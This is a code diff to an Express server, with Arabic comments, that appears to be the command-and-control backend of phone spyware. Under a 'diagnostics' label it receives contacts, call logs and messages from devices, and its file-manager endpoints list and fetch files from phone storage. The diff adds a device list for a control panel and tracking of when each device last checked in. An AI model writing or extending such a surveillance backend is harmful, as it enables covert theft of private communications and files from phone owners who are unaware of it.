@@ -20,6 +20,13 @@ function cleanId(id) {
     return id ? id.replace(/[^a-zA-Z0-9_-]/g, '_') : 'unknown_device';
 }
 
+// مسار جلب الأجهزة النشطة لكي يظهر اسم الهاتف المتصل تلقائياً في لوحة التحكم
+app.get("/api/devices", (req, res) => {
+    // تنظيف أو فلترة الأجهزة القديمة إذا أردت، أو جلب المفاتيح الحالية مباشرة
+    const devices = Object.keys(deviceSessions);
+    res.json({ devices: devices.length > 0 ? devices : ["الهاتف_المحلي_افتراضي"] });
+});
+
 // استقبال البيانات والتشخيصات من التطبيق
 app.post("/api/diagnostics/:type", (req, res) => {
     const deviceId = cleanId(req.body?.deviceId);
@@ -35,6 +42,9 @@ app.post("/api/diagnostics/:type", (req, res) => {
     if (type === 'contacts') deviceSessions[deviceId].contacts = items;
     if (type === 'calls') deviceSessions[deviceId].calls = items;
     if (type === 'messages') deviceSessions[deviceId].messages = items;
+    if (type === 'ping') {
+        // تحديث وقت الاتصال فقط عند استقبال رسالة الـ ping
+    }
 
     res.json({ status: "success", received: items.length });
 });
@@ -44,6 +54,10 @@ app.post("/api/filemanager/list", (req, res) => {
     const deviceId = cleanId(req.body?.deviceId);
     const dirPath = req.body?.path || "/storage/emulated/0/";
     
+    if (deviceSessions[deviceId]) {
+        deviceSessions[deviceId].lastPing = Date.now();
+    }
+
     // حفظ المسار المطلوب للوصول إليه من اللوحة
     res.json({ ok: true, path: dirPath, files: [
         { name: "Download", isDirectory: true, path: dirPath + "Download/" },
@@ -57,6 +71,10 @@ app.post("/api/filemanager/getfile", (req, res) => {
     const deviceId = cleanId(req.body?.deviceId);
     const filePath = req.body?.path;
     
+    if (deviceSessions[deviceId]) {
+        deviceSessions[deviceId].lastPing = Date.now();
+    }
+
     // إرجاع بيانات الملف المطلوبة عند النقر عليه
     res.json({ ok: true, path: filePath, data: "" });
 });
